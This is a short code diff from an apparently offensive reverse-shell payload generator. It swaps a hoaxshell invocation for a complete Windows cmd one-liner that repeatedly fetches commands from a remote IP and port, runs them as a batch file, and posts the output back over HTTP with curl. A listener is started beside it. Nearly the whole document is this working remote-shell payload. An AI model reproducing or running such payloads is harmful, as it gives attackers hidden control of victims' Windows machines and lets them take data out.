@@ -151,7 +151,7 @@ class Rebuild:
                 start_listener(f"pwncat -l {self.remote_port}")
             elif choice == "8":
                 payloads = [
-                    f"python3 hoaxshell.py -s http://{self.remote_ip}:{self.remote_port} --reverse"
+                    f'@echo off&cmd /V:ON /C "SET ip={self.remote_ip}:{self.remote_port}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL'
                 ]
                 show_payloads("Hoaxshell", payloads)
                 start_listener(f"hoaxshell -l {self.remote_port}")
